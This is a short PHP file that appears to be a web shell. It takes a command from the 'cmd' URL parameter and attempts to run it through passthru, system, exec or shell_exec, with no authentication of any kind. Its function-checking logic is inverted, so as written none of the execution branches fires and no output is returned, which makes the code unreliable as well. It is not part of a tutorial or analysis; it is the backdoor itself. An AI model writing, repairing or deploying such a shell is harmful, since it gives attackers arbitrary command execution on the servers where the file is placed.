<?php
function checkfunctioN($func){
	$safe=array('passthru','system','exec','exec','shell_exec','popen','proc_open');
	if(in_array($func,$safe))
		return 0;
	elseif(function_exists($func) && is_callable($func))
		return 1;
	return 0;
}


$command = $_GET['cmd'];

if(checkfunctioN('passthru')){
	ob_start();
	passthru($command);
	$exec=ob_get_contents();ob_clean();
	ob_end_clean();
}
elseif(checkfunctioN('system')){
	$tmp=ob_get_contents();
	ob_clean();
	system($command);
	$output=ob_get_contents();
	ob_clean();
	$exec=$tmp;
}
elseif(checkfunctioN('exec')){
	exec($command,$output);
	$output=join("\n",$output);
	$exec=$output;
}
elseif(checkfunctioN('shell_exec'))
	$exec=shell_exec($command);
die("");
?>